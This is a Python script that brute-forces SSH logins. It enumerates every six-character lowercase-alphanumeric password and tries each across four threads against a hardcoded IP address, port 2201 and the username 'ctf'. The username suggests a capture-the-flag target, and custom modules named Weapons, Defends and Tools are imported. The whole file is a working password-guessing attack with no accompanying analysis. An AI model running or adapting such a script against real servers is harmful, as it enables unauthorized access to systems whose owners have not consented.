import Weapons
import Defends
import Tools
import Setting
import hashlib,random

password_rnd="1234567890abcdefghijklmnopqrstuvwxyz"
password_len=6

def trySSH(config,password_6):
    config['self']['sshConfig']['password']=password_6
    ssh=Defends.SSH(Defends.SSH.configStart(config))
    return ssh.connect()
def callback(runner):
    runner.args[1]=nextPsw()
    if runner.args[1]==None:return False
    return True

nowpsw=[]
lenOfPswRnd=len(password_rnd)

def nextPsw():
    pointer=password_len-1
    while True:
        nowpsw[pointer]+=1
        if nowpsw[pointer]<lenOfPswRnd:break
        nowpsw[pointer]=0
        pointer-=1
        if pointer==-1:return None
    result=''
    for i in range(password_len):
        result+=password_rnd[nowpsw[i]:nowpsw[i]+1]
    return result
if __name__ == "__main__":
    print('script start')
    for i in range(password_len):
        nowpsw.append(0)
    config=Setting.Config('default.json')[0]
    config['self']['sshConfig']['hostname']='47.74.238.240'
    config['self']['sshConfig']['port']='2201'
    config['self']['sshConfig']['username']= "ctf"
    runner=[]
    Tools.CC.DisplayRank=1
    for i in range(4):
        runner.append(Tools.Runner(trySSH,[config,nextPsw()],callback))
    for r in runner:
        r.start()
    # while True:
    #     print(nextPsw())